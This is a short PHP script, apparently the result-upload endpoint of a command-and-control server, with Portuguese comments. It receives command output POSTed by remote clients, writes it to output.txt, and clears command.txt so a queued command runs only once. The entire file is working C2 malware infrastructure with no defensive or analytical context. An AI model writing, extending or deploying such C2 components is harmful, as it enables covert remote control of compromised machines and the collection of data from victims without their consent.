<?php
// /c2/upload_result.php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd_output'])) {
    $output = $_POST['cmd_output'];
    
    // Salva a saída do comando em output.txt
    file_put_contents('output.txt', $output);
    
    // Opcional: Limpar o comando para que ele só seja executado uma vez.
    file_put_contents('command.txt', 'NO_COMMAND');

    http_response_code(200);
    echo "OK";
} else {
    http_response_code(400);
    echo "ERROR";
}
?>
